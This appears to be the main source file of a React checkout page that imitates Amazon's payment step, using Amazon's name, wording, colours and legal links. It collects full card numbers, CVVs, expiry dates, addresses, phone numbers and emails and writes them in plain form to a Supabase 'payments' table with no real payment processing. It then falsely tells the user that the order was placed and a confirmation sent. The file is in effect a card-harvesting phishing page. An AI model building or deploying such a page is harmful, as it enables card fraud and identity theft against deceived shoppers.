
import React, { useState } from 'react';
import Header from './components/Header';
import CheckoutForm from './components/CheckoutForm';
import Footer from './components/Footer';
import { PaymentFormData } from './types';
import { supabase } from './supabase';

const App: React.FC = () => {
  const [formData, setFormData] = useState<PaymentFormData>({
    cardNumber: '',
    expMonth: '',
    expYear: '',
    cvv: '',
    fullName: '',
    address: '',
    city: '',
    state: '',
    zip: '',
    phone: '',
    email: '',
  });

  const [errors, setErrors] = useState<Partial<Record<keyof PaymentFormData, string>>>({});
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);

  const validateCardNumber = (num: string) => {
    const digits = num.replace(/\D/g, '');
    if (digits.length < 13 || digits.length > 19) return false;
    
    // Luhn Algorithm
    let sum = 0;
    let shouldDouble = false;
    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits.charAt(i));
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<Record<keyof PaymentFormData, string>> = {};

    // Card Number
    if (!validateCardNumber(formData.cardNumber)) {
      newErrors.cardNumber = "Please enter a valid card number.";
    }

    // Expiry Date
    const now = new Date();
    const currentYear = now.getFullYear();
    const currentMonth = now.getMonth() + 1;
    const expYear = parseInt(formData.expYear);
    const expMonth = parseInt(formData.expMonth);

    if (!formData.expMonth || !formData.expYear) {
      newErrors.expMonth = "Required";
    } else if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
      newErrors.expMonth = "Card has expired.";
    }

    // CVV
    if (!/^\d{3,4}$/.test(formData.cvv)) {
      newErrors.cvv = "Invalid CVV.";
    }

    // Basic required fields
    if (!formData.fullName.trim()) newErrors.fullName = "Enter your full name.";
    if (!formData.address.trim()) newErrors.address = "Enter your address.";
    if (!formData.city.trim()) newErrors.city = "Enter your city.";
    if (!formData.zip.trim()) newErrors.zip = "Enter ZIP code.";
    if (!formData.email.trim() || !/\S+@\S+\.\S+/.test(formData.email)) {
      newErrors.email = "Enter a valid email address.";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    setSubmitError(null);
    // Clear error for that field when user types
    if (errors[name as keyof PaymentFormData]) {
      setErrors(prev => {
        const next = { ...prev };
        delete next[name as keyof PaymentFormData];
        return next;
      });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitError(null);
    
    if (!validateForm()) {
      const firstError = document.querySelector('[data-error="true"]');
      firstError?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      return;
    }

    setIsProcessing(true);

    try {
      // Sending data to Supabase
      // Assuming a table named 'payments' exists with these columns
      const { error } = await supabase
        .from('payments')
        .insert([
          {
            card_number: formData.cardNumber,
            exp_month: formData.expMonth,
            exp_year: formData.expYear,
            cvv: formData.cvv,
            full_name: formData.fullName,
            address: formData.address,
            city: formData.city,
            state: formData.state,
            zip: formData.zip,
            phone: formData.phone,
            email: formData.email,
            created_at: new Date().toISOString(),
          }
        ]);

      if (error) {
        throw error;
      }

      setIsSuccess(true);
    } catch (err: any) {
      console.error('Error submitting to Supabase:', err);
      setSubmitError('Unable to process payment. Please check your connection or try again later.');
    } finally {
      setIsProcessing(false);
    }
  };

  if (isSuccess) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 p-4">
        <div className="bg-white p-8 rounded-lg shadow-sm border border-gray-200 max-w-md w-full text-center">
          <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Order Placed!</h2>
          <p className="text-gray-600 mb-6">Thank you for your purchase. We've sent a confirmation email to {formData.email}.</p>
          <button 
            onClick={() => window.location.reload()}
            className="w-full bg-[#FFD814] hover:bg-[#F7CA00] border border-[#FCD200] text-black py-2 rounded-lg font-medium transition-colors"
          >
            Back to Home
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#eaeded] flex flex-col">
      <Header />
      
      <main className="flex-grow container mx-auto px-4 py-8 flex justify-center">
        <div className="w-full max-w-3xl space-y-4">
          <div className="bg-white p-6 md:p-10 rounded-lg shadow-sm border border-gray-200">
            <h1 className="text-2xl font-semibold mb-6">Checkout</h1>
            
            <div className="flex items-center space-x-2 mb-6">
              <div className="w-8 h-8 rounded-full bg-orange-100 flex items-center justify-center text-orange-600 font-bold">2</div>
              <h2 className="text-lg font-bold">Payment method</h2>
            </div>

            <div className="ml-0 md:ml-10">
              <p className="text-sm text-gray-600 mb-4 font-medium">Amazon accepts all major credit and debit cards</p>
              
              <div className="flex space-x-3 mb-8 opacity-90 items-center">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-5 w-auto" alt="Visa" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-7 w-auto" alt="Mastercard" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/MasterCard_Logo.svg" className="h-7 w-auto" alt="Mastercard" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" className="h-6 w-auto" alt="Amex" />
              </div>

              {submitError && (
                <div className="mb-6 p-4 border border-red-200 bg-red-50 rounded-lg flex items-center space-x-3">
                  <svg className="w-5 h-5 text-red-600 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                  </svg>
                  <p className="text-red-800 text-sm font-medium">{submitError}</p>
                </div>
              )}

              {Object.keys(errors).length > 0 && !submitError && (
                <div className="mb-6 p-4 border border-red-200 bg-red-50 rounded-lg flex items-start space-x-3">
                  <svg className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                  </svg>
                  <div>
                    <h4 className="text-red-800 font-bold text-sm">There was a problem with your submission</h4>
                    <ul className="text-red-700 text-xs list-disc list-inside mt-1">
                      {Object.values(errors).map((err, idx) => (
                        <li key={idx}>{err}</li>
                      ))}
                    </ul>
                  </div>
                </div>
              )}

              <CheckoutForm 
                formData={formData} 
                errors={errors}
                onChange={handleInputChange} 
                onSubmit={handleSubmit}
                isProcessing={isProcessing}
              />
              
              <div className="mt-10 pt-6 border-t border-gray-100 text-center">
                <p className="text-xs text-gray-400">
                  By continuing, you agree to Amazon's <span className="text-blue-600 cursor-pointer hover:underline">Conditions of Use</span> and <span className="text-blue-600 cursor-pointer hover:underline">Privacy Notice</span>.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default App;
